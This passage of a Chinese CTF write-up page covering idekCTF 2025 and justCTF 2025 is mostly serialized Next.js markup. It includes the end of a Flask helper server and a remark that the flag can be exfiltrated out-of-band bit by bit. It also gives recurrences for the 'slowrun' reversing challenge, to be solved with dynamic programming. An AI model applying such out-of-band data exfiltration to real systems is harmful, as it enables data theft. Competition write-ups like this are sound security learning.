render_template(\\\"index.html\\\", target=target, note_id=note_id)\\n\\n\\napp.run(\\\"0.0.0.0\\\", 5003)\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$29\"}}]}]]}],[\"$\",\"$L21\",null,{\"src\":\"3.jpg\",\"filterDarkTheme\":true}],[\"$\",\"$L21\",null,{\"src\":\"4.jpg\",\"filterDarkTheme\":true}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这样就可以逐位带外flag了。（也可以考虑更自动化的实现）\"}}],[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"justCTF/rev/slowrun\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"分析整个程序能看出这是一个大整数运算的实现，生成flag时有两个函数递归进行调用：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"F(x): x - 4 + (73 * x**5) + (8 * x**3) + G(x-1), F(0) = 2, else F(x) = 1 for x \u003c= 1\\nG(x): F(x-1) + 3F(x-2) - 5F(x-3) + (3 * x**4), G(x) = 1 for x \u003c= 1\\nflag = F(13337) % A + B\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"F(x): x - 4 + (73 * x**5) + (8 * x**3) + G(x-1), F(0) = 2, else F(x) = 1 for x \u0026lt;= 1\\nG(x): F(x-1) + 3F(x-2) - 5F(x-3) + (3 * x**4), G(x) = 1 for x \u0026lt;= 1\\nflag = F(13337) % A + B\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"A和B是两个大整数常数，可以直接在程序中找到。\u003ccode class=\\\"x-inline-highlight\\\"\u003eF\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003eG\u003c/code\u003e函数的递归调用会导致计算量非常大，直接运行会超时，用动态规划重写一下：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$2a\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$2b\"}}]}]]}]]\n"])</script><script>self.__next_f.push([1,"12:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"idekCTF 2025 \u0026 justCTF 2025 Writeup - 铃木的网络日记\"}],[\"$\",\"link\",\"3\",{\"rel\":\"canonical\",\"href\":\"https://1kuzus.github.io/25c/wp-idekctf-justctf-2025/\"}]]\n6:null\n"])</script><script>self.__next_f.push([1,""])</script></body></html>